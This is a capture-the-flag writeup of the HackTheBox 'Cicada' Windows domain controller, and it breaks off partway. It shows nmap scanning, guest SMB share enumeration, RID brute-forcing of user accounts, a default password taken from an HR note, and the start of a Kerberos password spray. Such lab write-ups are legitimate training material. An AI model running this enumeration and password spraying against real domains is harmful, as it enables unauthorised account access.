---
render_with_liquid: false
title: HackTheBox Writeup  Cicada
date: 2024-10-01 22:38:33 +1400
tags: [hackthebox, nmap, windows, ad, netexec, discover-notes, credentials-exposure, password-spraying, smartbrute, ldeep, powershell-script, evil-winrm, ad-backup-operators, golden-ticket, backupoperatortoolkit]
---



# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ pt init '10.129.206.45 cicada.htb CICADA-DC.cicada.htb CICADA-DC'
+---------+--------+---------------+----------------------+
| PROFILE | STATUS |      IP       |        DOMAIN        |
+---------+--------+---------------+----------------------+
| cicada  | on     | 10.129.206.45 | cicada.htb           |
| cicada  | on     | 10.129.206.45 | CICADA-DC.cicada.htb |
| cicada  | on     | 10.129.206.45 | CICADA-DC            |
+---------+--------+---------------+----------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Oct  1 22:38:32 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,636,3268,3269,5985, 10.129.206.45
Nmap scan report for 10.129.206.45
Host is up, received user-set (0.28s latency).
Scanned at 2024-10-01 22:38:33 CST for 142s

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-01 21:38:42Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-01T21:40:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57436/tcp): CLEAN (Timeout)
|   Check 2 (port 47734/tcp): CLEAN (Timeout)
|   Check 3 (port 16665/udp): CLEAN (Timeout)
|   Check 4 (port 26185/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Oct  1 22:40:55 2024 -- 1 IP address (1 host up) scanned in 143.06 seconds
```


## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u '' -p ''
nxc smb $(pt get rhost) -u 'a' -p ''
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\:
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\a: (Guest)
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u 'a' -p '' --shares
SMB         10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.206.45   445    CICADA-DC        [+] cicada.htb\a: (Guest)
SMB         10.129.206.45   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.206.45   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.206.45   445    CICADA-DC        -----           -----------     ------
SMB         10.129.206.45   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.206.45   445    CICADA-DC        C$                              Default share
SMB         10.129.206.45   445    CICADA-DC        DEV
SMB         10.129.206.45   445    CICADA-DC        HR              READ
SMB         10.129.206.45   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.206.45   445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.206.45   445    CICADA-DC        SYSVOL                          Logon server share
```

### Groups & Users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ nxc smb $(pt get rhost) -u 'a' -p '' --rid-brute | tee enum/nxc_rid_brute.log
cat enum/nxc_rid_brute.log | grep SidTypeUser | awk -F'\' '{print $2}' | awk '{print $1}' > enum/users.lst
cat enum/nxc_rid_brute.log | grep SidTypeGroup | awk -F'\' '{print $2}' | awk '{print $1}' > enum/groups.lst
SMB                      10.129.206.45   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB                      10.129.206.45   445    CICADA-DC        [+] cicada.htb\a: (Guest)
SMB                      10.129.206.45   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB                      10.129.206.45   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB                      10.129.206.45   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.206.45   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.206.45   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB                      10.129.206.45   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.129.206.45   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB                      10.129.206.45   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

# User Flag
---

## Auth as michael.wrightson


### 445 - SMB : Default password in notes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ /home/kali/scripts/utils/dump_smb.sh $(pt get rhost) 'a' ''
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ cd loot/smb

┌──(bravosec㉿fsociety)-[~/htb/Cicada/loot/smb]
└─$ find . -type f -exec ls -latr {} + 2>/dev/null
-rw-r--r-- 1 bravosec kali 1266 Oct  1 22:52 './HR/Notice from HR.txt'

┌──(bravosec㉿fsociety)-[~/htb/Cicada/loot/smb]
└─$ cat './HR/Notice from HR.txt'

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

### 88 - Kerberos : Password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cicada]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bU enum/users.lst -bp 'Cicada$M6Corpb*@Lp#nZp!8' kerberos -d $(pt get domain)

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
/opt/sectools/ad/smartbrute/smartbrute.py:307: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in
UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/opt/sectools/ad/smartbrute/smartbrute.py:351: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in
UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
┌────────────┬───────────────────┬──────────────────────────┬──────────────────┐
│ domain     │ user              │ password                 │ details          │
